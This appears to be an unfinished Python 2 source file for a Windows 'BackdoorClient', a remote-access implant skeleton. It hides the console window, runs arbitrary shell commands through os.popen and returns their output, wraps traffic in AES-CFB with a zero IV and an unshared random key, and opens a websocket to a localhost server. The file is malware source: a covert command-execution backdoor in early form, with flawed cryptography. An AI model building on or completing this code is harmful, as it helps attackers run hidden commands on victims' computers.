#!/usr/bin/env python
# coding:utf-8
import os
import ctypes
import chardet
import json
from websocket import create_connection
from Crypto.Cipher import AES
__author__ = 'nekocode'


class BackdoorClient:
    def __init__(self):
        self.SERVER_HOST = 'http://127.0.0.1'
        self.IV = '\0' * AES.block_size
        self.SECRET = os.urandom(32)

    def encrypt(self, text):
        encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        ciphertext = encryptor.encrypt(text)
        return ciphertext

    def decrypt(self, ciphertext):
        decryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
        plain = decryptor.decrypt(ciphertext)
        return plain

    def link_server(self):
        # todo http://stackoverflow.com/questions/3142705/is-there-a-websocket-client-implemented-for-python
        ws = create_connection("ws://localhost:8080/websocket")
        ws.send("Hello, World")
        result = ws.recv()
        ws.close()

    @staticmethod
    def hide_cmd_window():
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd != 0:
            ctypes.windll.user32.ShowWindow(whnd, 0)
            ctypes.windll.kernel32.CloseHandle(whnd)

    @staticmethod
    def dialog(content, title=u''):
        ctypes.windll.user32.MessageBoxW(None, content, title, 0)

    @staticmethod
    def cmd(cl):
        rlt = os.popen(cl)
        content = ''.join(rlt.readlines())
        return content.decode(chardet.detect(content)['encoding'])


if __name__ == '__main__':
    client = BackdoorClient()
    client.dialog(client.cmd('help'))
    # t = client.encrypt('1231231233')
    # print client.decrypt(t)

